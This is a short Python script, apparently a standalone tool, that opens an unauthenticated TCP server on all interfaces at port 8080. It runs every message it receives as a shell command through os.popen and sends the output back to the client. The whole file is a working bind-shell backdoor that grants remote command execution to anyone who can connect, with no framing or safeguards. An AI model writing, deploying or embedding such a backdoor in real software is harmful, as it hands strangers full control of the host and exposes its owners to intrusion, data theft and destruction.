import socket, threading, os

class ClientThread(threading.Thread):
    def __init__(self,clientAddress,clientsocket):
        threading.Thread.__init__(self)
        self.csocket = clientsocket
        print ("New connection added: ", clientAddress)
    def run(self):
        print ("Connection from : ", clientAddress)
        #self.csocket.send(bytes("Hi, This is from Server..",'utf-8'))
        msg = ''
        while True:
            data = self.csocket.recv(2048)
            msg = data.decode()
            if msg=='bye':
              break
            print ("from client", msg)
            stream = os.popen(msg)
            result = stream.read()
            out_data = str(result)
            print(len(out_data))
            #self.csocket.sendall(bytes(out_data,'UTF-8'))
            self.SplitSend(out_data)
        print ("Client at ", clientAddress , " disconnected...")
        
    def SplitSend(self,data):
        o = []
        s = data
        while s:
            o.append(s[:500])
            s = s[500:]
        for d in o:
            self.csocket.send(d.encode('utf-8'))
LOCALHOST = "0.0.0.0"
PORT = 8080
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((LOCALHOST, PORT))
print("Server started")
print("Waiting for client request..")
while True:
    server.listen(1)
    clientsock, clientAddress = server.accept()
    newthread = ClientThread(clientAddress, clientsock)
    newthread.start()
